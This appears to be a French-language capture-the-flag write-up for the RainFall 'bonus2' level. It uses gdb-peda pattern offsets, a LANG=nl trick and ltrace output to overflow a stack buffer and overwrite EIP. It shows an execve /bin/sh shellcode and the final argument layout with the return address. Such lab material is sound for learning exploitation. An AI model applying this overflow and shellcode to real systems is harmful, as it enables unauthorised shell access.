<pre>
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
Starting program: /home/alarm/rainfall/bonus2/Ressources/bonus2 $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x4f ('O')
EBX: 0xffffd3b0 ('A' <repeats 43 times>, "%AAsAABAA$AAnAACAA-AA(AADAA;A")
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xffffd3fc --> 0xffffdc6a ("en_US.UTF-8")
EDI: 0xffffd3ac --> 0x1 
EBP: 0x41414441 ('ADAA')
ESP: 0xffffd360 ('A' <repeats 43 times>, "%AAsAABAA$AAnAACAA-AA(AADAA;A")
EIP: 0x800413b
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
<strong>Invalid $PC address: 0x800413b</strong>
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0800413b in ?? ()
gdb-peda$ pattern offset 'A;'
<strong>A; found at offset: 29</strong>
</pre>

- Quand LANG est different en different de NULL alors var_60 est ecrit dans string
- Sauf que vu qu'il y a deja un overide dans le strcpy de l'arg[1] les var_60 et var_38 sont considerer comme un seul argument
<pre>
$> LANG=nl gdb ./bonus2 

gdb-peda$ pattern create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
gdb-peda$ r $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
Starting program: /home/alarm/rainfall/bonus2/Ressources/bonus2 $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'

Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

[----------------------------------registers-----------------------------------]
ESP: 0xffffd4d0 ("DAA;A")
<strong>EIP: 0x41412841 ('A(AA')</strong>
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412841
[------------------------------------stack-------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412841 in ?? ()
gdb-peda$ pattern offset 'A(AA'
<strong>A(AA found at offset: 23</strong>
</pre>
- On recupere la bonne addresse memoire ou sera stocké le shellcode
<pre>
bonus2@RainFall:~$ LANG=nl ltrace ./bonus2 $(/tmp/shell) "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
\__libc_start_main(0x8048529, 3, 0xbffff684, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(<strong>0xbffff580</strong>, "1\311\367\341Qh//shh/bin\211\343\260\013\315\200AAAAAAAAAAA"..., 40) = 0xbffff580
strncpy(0xbffff5a8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 32)                            = 0xbffff5a8
getenv("LANG")                                                                            = "nl"
memcmp(0xbffff84c, 0x804873d, 2, 0xb7fff918, 0)                                           = 1
memcmp(0xbffff84c, 0x8048740, 2, 0xb7fff918, 0)                                           = 0
strcat("Goedemiddag! ", "1\311\367\341Qh//shh/bin\211\343\260\013\315\200AAAAAAAAAAA"...) = "Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...
puts("Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...)                          = 86
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</pre>
- Du coup on peut lancer le programme avec les argument suivant
| arg 1 | arg 2 |
|-------|-------|
| shellcode + `A` * 20 | `B` * 23 + `\x80\xf5\xff\xbf` |
- On creer des .c car en python ca bug
